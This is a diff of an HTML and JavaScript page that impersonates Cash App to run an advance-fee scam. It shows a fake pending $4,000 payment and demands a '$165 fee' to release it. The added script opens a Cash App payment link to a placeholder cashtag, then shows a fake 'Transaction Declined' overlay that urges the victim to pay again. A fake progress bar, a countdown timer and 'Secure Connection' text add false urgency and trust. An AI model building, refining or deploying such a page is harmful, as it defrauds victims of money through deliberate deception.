@@ -20,6 +20,7 @@
       display:flex;
       justify-content:center;
       padding:24px 14px;
+      overflow-x: hidden;
     }
 
     .page{
@@ -44,7 +45,6 @@
       font-weight:800;
     }
 
-    /* INSERT YOUR LOGO HERE */
     .brand-logo{
       width:46px;
       height:46px;
@@ -122,7 +122,6 @@
       margin-bottom:10px;
     }
 
-    .to,
     .txn{
       text-align:center;
       color:#bdbdbd;
@@ -255,191 +254,185 @@
       color:#58e76e;
     }
 
-    @media(max-width:480px){
-
-      .title{
-        font-size:29px;
-      }
-
-      .subtitle{
-        font-size:17px;
-      }
-
-      .amount{
-        font-size:40px;
-      }
-
-      .notice p,
-      .status p{
-        font-size:16px;
-      }
-
+    /* --- ERROR OVERLAY STYLES --- */
+    #errorOverlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(8, 11, 13, 0.98);
+      z-index: 10000;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      padding: 30px;
+      text-align: center;
+      backdrop-filter: blur(10px);
     }
 
+    .error-circle {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      background: rgba(255, 95, 95, 0.1);
+      border: 1px solid rgba(255, 95, 95, 0.3);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 50px;
+      color: #ff5f5f;
+      margin-bottom: 25px;
+      box-shadow: 0 0 30px rgba(255, 95, 95, 0.15);
+    }
+
+    .error-title {
+      color: #ff5f5f;
+      font-size: 28px;
+      font-weight: 800;
+      margin-bottom: 15px;
+    }
+
+    .error-text {
+      color: #fff;
+      font-size: 19px;
+      line-height: 1.6;
+      margin-bottom: 35px;
+    }
+
+    .retry-btn {
+      background: #fff;
+      color: #000;
+      padding: 18px 50px;
+      border-radius: 50px;
+      font-weight: 800;
+      font-size: 18px;
+      border: none;
+      cursor: pointer;
+    }
+
+    @media(max-width:480px){
+      .title{ font-size:29px; }
+      .subtitle{ font-size:17px; }
+      .amount{ font-size:40px; }
+      .notice p, .status p{ font-size:16px; }
+    }
   </style>
 </head>
 
 <body>
 
+  <div id="errorOverlay">
+    <div class="error-circle">✕</div>
+    <h2 class="error-title">Transaction Declined</h2>
+    <p class="error-text">
+      Unable to deposit Payment.<br>
+      <strong>$165.00 fee needed</strong> to release your balance.
+    </p>
+    <button class="retry-btn" onclick="closeError()">Retry Payment</button>
+  </div>
+
   <div class="page">
-
     <div class="top">
-
       <div class="brand">
-
-        <!-- INSERT YOUR OWN LOGO -->
         <img src="cashappgreen.png" alt="Logo" class="brand-logo">
-
         <span>Cashapp</span>
-
       </div>
-
-      <div class="secure">Secure Conection</div>
-
+      <div class="secure">Secure Connection</div>
     </div>
 
     <div class="clock">🕒</div>
-
     <h1 class="title">Payment Pending</h1>
-
-    <p class="subtitle">
-      we're verifying your payment. This usually takes less than 30 minutes
-    </p>
+    <p class="subtitle">we're verifying your payment. This usually takes less than 30 minutes</p>
 
     <div class="card">
-
       <div class="amount-top">
         <span>Amount</span>
         <span class="pill">USD</span>
       </div>
-
       <div class="amount">$4,000.00</div>
-
-      <div class="txn">
-        Transaction ID: DEMO-9082-2482
-      </div>
-
+      <div class="txn">Transaction ID: DEMO-9082-2482</div>
     </div>
 
     <div class="status">
-
-      <h3>Verifying receipint account...</h3>
-
+      <h3>Verifying recipient account...</h3>
       <p>Synchronization in progress</p>
-
     </div>
 
     <div class="progress-row">
-
-      <div class="progress-bg">
-
-        <div class="progress-fill" id="progressFill"></div>
-
-      </div>
-
+      <div class="progress-bg"><div class="progress-fill" id="progressFill"></div></div>
       <div class="percent" id="percentText">0%</div>
-
     </div>
 
     <div class="notice">
-
       <div class="shield">⛨</div>
-
       <div>
-
         <h3> ⚠️ Action Required</h3>
-
-        <p>
-          Blockchain Transfer Detected, make a one time fee payment of $165 then open Cashapp, Your balance would be in your cashapp.
-        </p>
-
+        <p>Blockchain Transfer Detected, make a one time fee payment of $165 then open Cashapp, Your balance would be in your cashapp.</p>
       </div>
-
     </div>
 
-    <div class="countdown">
-      ⏱ This link will expire in
-      <span id="timer">30:00</span>
-    </div>
+    <div class="countdown">⏱ This link will expire in <span id="timer">30:00</span></div>
 
-    <button class="btn">
-      Open in Cashapp
-    </button>
+    <button class="btn" id="mainActionBtn">Open in Cashapp</button>
 
     <div class="footer">
       🔒 Secure encryption in progress <br>
       <strong>Payment will be processed upon fee payment</strong>
     </div>
-
   </div>
 
   <script>
-  // --- Progress Bar Logic ---
-  const progressFill = document.getElementById("progressFill");
-  const percentText = document.getElementById("percentText");
-  let progress = 0;
+    // --- Progress Bar Logic ---
+    const progressFill = document.getElementById("progressFill");
+    const percentText = document.getElementById("percentText");
+    let progress = 0;
+    const progressInterval = setInterval(() => {
+      if (progress >= 90) { clearInterval(progressInterval); return; }
+      progress++;
+      progressFill.style.width = progress + "%";
+      percentText.textContent = progress + "%";
+    }, 45);
 
-  const progressInterval = setInterval(() => {
-    if (progress >= 90) {
-      clearInterval(progressInterval);
-      return;
+    // --- Countdown Timer Logic ---
+    const timer = document.getElementById("timer");
+    let timeLeft = 30 * 60;
+    const countdown = setInterval(() => {
+      const minutes = Math.floor(timeLeft / 60);
+      const seconds = timeLeft % 60;
+      timer.textContent = String(minutes).padStart(2, "0") + ":" + String(seconds).padStart(2, "0");
+      if (timeLeft <= 0) { clearInterval(countdown); timer.textContent = "00:00"; }
+      timeLeft--;
+    }, 1000);
+
+    // --- CASHAPP REDIRECT & ERROR HANDLING ---
+    const cashAppBtn = document.getElementById("mainActionBtn");
+    const errorOverlay = document.getElementById("errorOverlay");
+
+    cashAppBtn.addEventListener("click", () => {
+      // 1. Visual Feedback
+      cashAppBtn.innerText = "Connecting...";
+      cashAppBtn.style.opacity = "0.7";
+
+      // 2. Redirect attempt
+      const cashtag = "YourCashtag"; // <-- SET YOUR TAG HERE
+      const amount = "165";
+      const appUrl = `cashme://cash.app/$${cashtag}/${amount}`;
+      
+      window.location.href = appUrl;
+
+      // 3. Show your custom error message after 4 seconds
+      setTimeout(() => {
+        errorOverlay.style.display = "flex";
+        cashAppBtn.innerText = "Open in Cashapp";
+        cashAppBtn.style.opacity = "1";
+      }, 4000);
+    });
+
+    function closeError() {
+      errorOverlay.style.display = "none";
     }
-    progress++;
-    progressFill.style.width = progress + "%";
-    percentText.textContent = progress + "%";
-  }, 45);
-
-  // --- Countdown Timer Logic ---
-  const timer = document.getElementById("timer");
-  let timeLeft = 30 * 60;
-
-  const countdown = setInterval(() => {
-    const minutes = Math.floor(timeLeft / 60);
-    const seconds = timeLeft % 60;
-
-    timer.textContent =
-      String(minutes).padStart(2, "0") +
-      ":" +
-      String(seconds).padStart(2, "0");
-
-    if (timeLeft <= 0) {
-      clearInterval(countdown);
-      timer.textContent = "00:00";
-    }
-    timeLeft--;
-  }, 1000);
-
-   // --- Updated Cash App Redirect Logic ---
-  const cashAppBtn = document.querySelector(".btn");
-
-  cashAppBtn.addEventListener("click", (e) => {
-    e.preventDefault(); // Stop any browser default actions
-    
-    // Replace 'YourCashtag' with your actual tag
-    const cashtag = "YourCashtag"; 
-    const amount = "165";
-    
-    // We use the 'cashme://' scheme to force the phone to open the APP specifically
-    const appScheme = `cashme://cash.app/$${cashtag}/${amount}`;
-    const webFallback = `https://cash.app/$${cashtag}/${amount}`;
-
-    // Create a temporary hidden link and click it
-    // This is the most reliable way to bypass the "Glitch" screen
-    const link = document.createElement('a');
-    link.href = appScheme;
-    
-    // Try to open the app directly
-    window.location.replace(appScheme);
-
-    // If the app doesn't open in 500ms, go to the web version
-    setTimeout(() => {
-      window.location.href = webFallback;
-    }, 500);
-  });
-
-
-</script>
-
-
+  </script>
 </body>
 </html>
